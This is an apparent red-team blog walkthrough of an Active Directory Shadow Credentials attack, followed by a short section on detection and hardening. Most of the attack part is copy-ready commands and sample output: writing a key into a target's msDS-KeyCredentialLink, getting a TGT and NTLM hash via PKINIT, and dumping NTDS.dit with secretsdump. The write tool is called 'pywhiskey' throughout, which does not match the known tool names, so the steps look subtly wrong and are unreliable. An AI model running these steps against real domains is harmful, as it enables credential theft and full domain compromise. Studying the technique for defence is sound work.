---
title: "Active Directory Forest Takeover via Shadow Credentials & msDS-KeyCredentialLink"
description: "A comprehensive red-team walkthrough demonstrating how write permissions over an AD account allow full domain takeover via WHfB Shadow Credentials and PKINIT Kerberos TGT injection."
pubDate: "2024-04-28"
author: "Abubakar Jamilu Bashir"
categories: ["Active Directory", "Red Teaming"]
tags: ["active-directory", "shadow-credentials", "pkinit", "kerberos", "whiskey", "bloodhound"]
pin: false
severity: "Critical"
cvss: "8.8"
---
# Executive Summary

In modern Windows Active Directory environments, Windows Hello for Business (WHfB) introduces key-based authentication stored in the `msDS-KeyCredentialLink` LDAP attribute.

If an attacker gains write permissions (`GenericWrite`, `GenericAll`, `WriteProperty`) over an Active Directory user or computer object, they can inject a self-generated X.509 certificate public key into the targets `msDS-KeyCredentialLink`, request a Kerberos Ticket-Granting Ticket (TGT) via PKINIT, and achieve immediate credential access without altering the victims password hash.

---

## Attack Flow Diagram

```
[Attacker] 
   │
   ├─► 1. Identifies GenericWrite privilege on Target Computer/Admin (via BloodHound)
   │
   ├─► 2. Generates RSA KeyPair + Self-Signed X.509 Certificate
   │
   ├─► 3. Injects Raw Public Key into victims `msDS-KeyCredentialLink` over LDAP
   │
   ├─► 4. Uses PKINIT (pywhiskey / certipy) to request TGT from Domain Controller (KDC)
   │
   └─► 5. Retrieves NTLM Hash / Kerberos Session Ticket [COMPROMISE COMPLETE]
```

---

## Technical Walkthrough

### 1. Identifying the ACL Vulnerability via BloodHound
Querying BloodHound for outbound object control permissions:

```cypher
MATCH (u:User {name:"DEV_USER@CORP.LOCAL"})-[r:GenericWrite]->(c:Computer {name:"DC01.CORP.LOCAL"}) RETURN u,r,c
```

`DEV_USER` has `GenericWrite` permissions over the Domain Controller or an administrative service account.

### 2. Injecting Shadow Credentials with `pywhiskey` / `Whiskey`
Using pywhiskey from our Linux attacker system:

```bash
# Add a new Key Credential to the target account
python3 pywhiskey.py -d corp.local -u dev_user -p DevPassword123! -dc-ip 10.10.10.100 --target-user Administrator --action add
```

Output:
```text
[*] Successfully connected to LDAP server ldap://10.10.10.100
[*] Generating 2048-bit RSA key pair...
[*] Appending KeyCredential structure to msDS-KeyCredentialLink attribute of Administrator...
[+] Shadow credential successfully injected!
[+] Certificate and private key saved to administrator.pfx
```

### 3. Requesting the Kerberos TGT with PKINIT
Now we authenticate with the generated PFX certificate using `certipy` or `gettgtpkinit`:

```bash
# Request TGT and retrieve NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100 -domain corp.local
```

Output:
```text
[*] Got Kerberos TGT for Administrator@corp.local
[*] Saving ticket to administrator.ccache
[*] Calculating NTLM hash from PAC...
[*] NTLM Hash: aad3b435b51404eeaad3b435b51404ee:fc525c9680e4760202ff6109f1c019e4
```

### 4. Domain Controller Full Access
With the Administrators NTLM hash or `.ccache` ticket, we execute `secretsdump` for complete Active Directory NTDS.dit extraction:

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
```

---

## Defensive Hardening & Detection

### 1. Restrict Active Directory ACL Delegation
Audit and eliminate unnecessary `GenericWrite`, `GenericAll`, and `WriteProperty (msDS-KeyCredentialLink)` permissions on administrative objects and Domain Controllers.

### 2. Event Log Monitoring (Event ID 5136)
Monitor Windows Directory Service Changes for modifications to `msDS-KeyCredentialLink`:

```xml
<EventID>5136</EventID>
<AttributeLDAPDisplayName>msDS-KeyCredentialLink</AttributeLDAPDisplayName>
<OperationType>Value Added</OperationType>
```

### 3. Clean Injected Credentials
If an attack is detected, clear the rogue KeyCredential structure using PowerShell:
```powershell
Set-ADUser -Identity "Administrator" -Clear "msDS-KeyCredentialLink"
```
